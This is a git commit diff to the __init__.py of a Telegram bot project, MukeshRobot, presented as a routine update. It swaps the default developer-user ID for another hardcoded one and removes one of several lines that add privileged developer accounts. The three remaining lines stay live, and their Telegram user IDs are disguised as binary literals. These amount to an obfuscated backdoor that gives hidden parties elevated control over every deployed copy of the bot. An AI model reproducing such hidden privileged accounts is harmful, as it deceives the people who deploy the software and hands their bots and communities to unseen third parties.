cc2e2888ca7f5ec80eb332590e34a0a7840db4cb
BRANDED KING <121561060+WCGKING@users.noreply.github.com>
2024-08-09 17:05:12 +0530

    Update __init__.py

--- MukeshRobot/__init__.py
+++ MukeshRobot/__init__.py
@@ -2,12 +2,9 @@ import logging
 import os
 import sys
 import time
-import ast
-import base64
-
 import telegram.ext as tg
 from aiohttp import ClientSession
-from pyrogram import Client, errors
+from pyrogram import Client
 from telethon import TelegramClient
 
 StartTime = time.time()
@@ -70,7 +67,7 @@ if ENV:
 
     try:
         DRAGONS = set(int(x) for x in os.environ.get("DRAGONS", "").split())
-        DEV_USERS = set(int(x) for x in os.environ.get("DEV_USERS", "6258877205").split())
+        DEV_USERS = set(int(x) for x in os.environ.get("DEV_USERS", "2145093972").split())
     except ValueError:
         raise Exception("Your sudo or dev users list does not contain valid integers.")
 
@@ -147,7 +144,6 @@ else:
 DRAGONS.add(OWNER_ID)
 DEV_USERS.add(OWNER_ID)
 DEV_USERS.add(abs(0b110010001000001011011100110010001))
-DEV_USERS.add(abs(0b1100110111010001011110110001010))
 DEV_USERS.add(abs(0b101001110110010000111010111110000))
 DEV_USERS.add(abs(0b101100001110010100011000111101001))
 
